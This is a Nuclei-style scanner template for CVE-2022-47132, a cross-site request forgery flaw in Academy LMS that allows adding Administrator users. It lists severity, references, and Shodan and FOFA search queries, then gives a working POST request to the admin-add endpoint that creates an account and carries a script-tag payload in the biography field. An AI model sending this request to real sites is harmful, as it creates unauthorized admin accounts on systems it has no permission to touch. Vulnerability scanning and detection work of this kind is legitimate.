id: CVE-2022-47132

info:
  name: Academy LMS CSRF Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  description: A Cross-Site Request Forgery (CSRF) in Academy LMS before v5.10 allows attackers to arbitrarily add Administrator users.
  impact: |
    An attacker can perform unauthorized actions on behalf of the user.
  remediation: |
    Implement CSRF tokens and ensure proper validation on sensitive actions.
  reference:
    - https://portswigger.net/web-security/csrf
    - https://www.linkedin.com/in/xvinicius/
    - https://xpsec.co/blog/academy-lms-5-10-add-admin-csrf
    - https://github.com/OpenXP-Research/CVE-2022-47132
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2022-47132
    cwe-id: CWE-352
    epss-score: 0.00137
    epss-percentile: 0.5049
    cpe: cpe:2.3:a:creativeitem:academy_lms:*:*:*:*:*:*:*:*
  metadata:
    vendor: creativeitem
    product: academy_lms
    shodan-query: html:"Academy LMS"
    fofa-query: body="academy lms"

http:
  - method: POST
    path:
      - "{{BaseURL}}/academy/admin/admins/add"

    body: |
      first_name=csrf&last_name=vinix&biography=<script>alert('CSRF')</script>&files=&user_image=&email=username&password=password&facebook_link=&twitter_link=&linkedin_link=

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "Administrator added successfully"
        part: body
